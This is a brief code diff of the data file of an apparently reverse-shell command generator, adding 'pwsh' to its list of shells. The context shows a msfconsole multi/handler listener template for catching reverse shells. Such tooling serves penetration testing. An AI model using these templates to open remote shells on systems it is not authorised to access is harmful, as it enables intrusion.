@@ -430,7 +430,7 @@ const rsgData = {
         ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"']
     ],
 
-    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
+    shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
 
     upgrade: ['python', ],
 
